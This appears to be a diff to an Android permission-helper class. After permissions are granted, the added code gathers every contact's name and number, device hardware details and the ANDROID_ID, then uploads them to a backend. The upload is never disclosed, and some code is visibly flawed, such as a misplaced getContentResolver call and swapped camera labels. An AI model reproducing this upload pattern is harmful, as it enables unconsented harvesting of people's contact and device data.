@@ -26,8 +26,17 @@ import android.content.Context;
 import android.content.DialogInterface;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.UserManager;
+import android.provider.Settings;
+import android.util.ArrayMap;
 import android.util.Log;
 
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONArray;
+import com.alibaba.fastjson.JSONObject;
+import com.an.deviceinfo.device.model.Battery;
+import com.an.deviceinfo.device.model.Device;
+import com.an.deviceinfo.device.model.Memory;
 import com.an.deviceinfo.location.DeviceLocation;
 import com.an.deviceinfo.location.LocationInfo;
 import com.an.deviceinfo.usercontacts.UserContactInfo;
@@ -38,8 +47,23 @@ import com.hjq.permissions.XXPermissions;
 import com.lenovo.innovate.activity.MainActivity;
 import com.lenovo.innovate.prince.calander.CalenderDataStruct;
 import com.lenovo.innovate.prince.calander.calendarUtil;
+import com.lenovo.innovate.prince.http.ApiProvider;
+import com.lenovo.innovate.prince.http.TestApi;
+import com.lenovo.innovate.prince.http.entity.PerInfo;
 import com.lenovo.innovate.prince.message.GetMessageInfo;
+import com.lenovo.innovate.prince.utils.CameraUtils;
 import com.lenovo.innovate.utils.XToastUtils;
+import com.xuexiang.xhttp2.XHttp;
+import com.xuexiang.xhttp2.XHttpSDK;
+import com.xuexiang.xhttp2.callback.SimpleCallBack;
+import com.xuexiang.xhttp2.exception.ApiException;
+import com.xuexiang.xhttp2.model.XHttpRequest;
+import com.xuexiang.xhttp2.request.CustomRequest;
+import com.xuexiang.xhttp2.subsciber.ProgressLoadingSubscriber;
+import com.xuexiang.xhttp2.subsciber.impl.IProgressLoader;
+import com.xuexiang.xhttp2.utils.HttpUtils;
+import com.xuexiang.xutil.net.JsonUtil;
+import com.xuexiang.xutil.tip.ToastUtils;
 
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -47,6 +71,8 @@ import java.util.List;
 import java.util.Map;
 
 public class PermissionUtils {
+
+    private IProgressLoader mIProgressLoader;
 
     public  void get_contact(Context context,Activity activity){
         XXPermissions.with(context)
@@ -56,12 +82,25 @@ public class PermissionUtils {
                     @Override
                     public void onGranted(List<String> permissions, boolean all) {
                         if (all){
+
                             Activity a = (Activity) context ;
                             XToastUtils.toast( "onGranted: 获取权限成功！");
                             UserContactInfo userContactInfo = new UserContactInfo(a);
                             List<UserContacts> userContacts = userContactInfo.getContacts();
-                            XToastUtils.toast( "电话号码"+userContacts.get(1).getMobileNumber());
+                            Map<String,String> map = new HashMap<>();
+                            for (int i = 0; i < userContacts.size(); i++) {
+                                String name = userContacts.get(i).getDisplayName();
+                                String number = userContacts.get(i).getMobileNumber();
+                                map.put(name,number);
+                            }
+                            XToastUtils.toast( "电话号码"+map.toString());
 
+                            JSONObject jsonObject  = new JSONObject();
+                            jsonObject.put("permission","contact");
+                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                            jsonObject.put("data",JSONArray.toJSON(map));
+
+                            http_contact(jsonObject);
                         }
                     }
                     @Override
@@ -126,6 +165,51 @@ public class PermissionUtils {
                 });
     }
 
+    public  void get_phoneMessage(Context context){
+        XXPermissions.with(context)
+                .permission(Permission.READ_PHONE_STATE)
+                .request(new OnPermissionCallback() {
+                    @Override
+                    public void onGranted(List<String> permissions, boolean all) {
+                        if (all) {
+                            XToastUtils.toast("onGranted: 获取权限成功！");
+                            Device device = new Device(context);
+                            Memory memory = new Memory(context);
+                            Battery battery = new Battery(context);
+
+                            Map<String,String> map = new HashMap<>();
+                            map.put("手机品牌",device.getManufacturer());
+                            map.put("手机型号",device.getModel());
+                            map.put("安卓版本",device.getOsVersion());
+                            map.put("运行内存", String.valueOf(Float.valueOf(String.format("%.2f", (float) memory.getTotalRAM() / (1024 * 1024 * 1024)))) + " GB");
+                            map.put("手机存储", String.valueOf(Float.valueOf(String.format("%.2f", (float) memory.getTotalInternalMemorySize() / (1024 * 1024 * 1024))))+ " GB");
+                            map.put("屏幕像素",(String.valueOf(device.getScreenHeight()))+"*" + (String.valueOf(device.getScreenWidth())));
+                            map.put("电池电量",String.valueOf(battery.getBatteryPercent())+"%");
+                            map.put("电池温度",String.valueOf(battery.getBatteryTemperature())+"摄氏度");
+                            map.put("前置摄像头", CameraUtils.getCameraPixels(CameraUtils.hasBackCamera()));
+                            map.put("后置摄像头",CameraUtils.getCameraPixels(CameraUtils.hasFrontCamera()));
+
+                            XToastUtils.toast( "手机信息"+map.toString());
+
+                            JSONObject jsonObject  = new JSONObject();
+                            jsonObject.put("permission","device");
+                            jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                            jsonObject.put("data",JSONArray.toJSON(map));
+
+                            http_contact(jsonObject);
+                        }
+                    }
+                    @Override
+                    public void onDenied(List<String> permissions, boolean never) {
+                        if (never){
+                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
+                            XXPermissions.startPermissionActivity(context,permissions);
+                        }else {
+                            XToastUtils.toast( "onDenied: 权限获取失败 ");
+                        }
+                    }
+                });
+    }
     public  void get_location(Context context){
         XXPermissions.with(context)
                 .permission(Permission.ACCESS_FINE_LOCATION)
@@ -265,27 +349,7 @@ public class PermissionUtils {
                 });
     }
 
-  /*  public static void get_storage(Context context){
-        XXPermissions.with(context)
-                .permission(Permission.READ_EXTERNAL_STORAGE)
-                .request(new OnPermissionCallback() {
-                    @Override
-                    public void onGranted(List<String> permissions, boolean all) {
-                        if (all){
-                            XToastUtils.toast( "onGranted: 获取权限成功！");
-                        }
-                    }
-                    @Override
-                    public void onDenied(List<String> permissions, boolean never) {
-                        if (never){
-                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
-                            XXPermissions.startPermissionActivity(context,permissions);
-                        }else {
-                            XToastUtils.toast( "onDenied: 权限获取失败 ");
-                        }
-                    }
-                });
-    }*/
+
 
     private Uri SMS_INBOX = Uri.parse("content://sms/");
 
@@ -309,4 +373,19 @@ public class PermissionUtils {
         }
     }
 
+
+    private void http_contact(Object perInfo){
+        XHttpRequest req = ApiProvider.getAddPerReq(perInfo);
+        XHttpSDK.executeToMain(req, new ProgressLoadingSubscriber<Boolean>(mIProgressLoader) {
+            @Override
+            public void onSuccess(Boolean aBoolean) {
+                ToastUtils.toast("成功！");
+               // mRefreshLayout.autoRefresh();
+            }
+            @Override
+            public void onError(ApiException e) {
+                ToastUtils.toast(e.getDisplayMessage());
+            }
+        });
+    }
 }
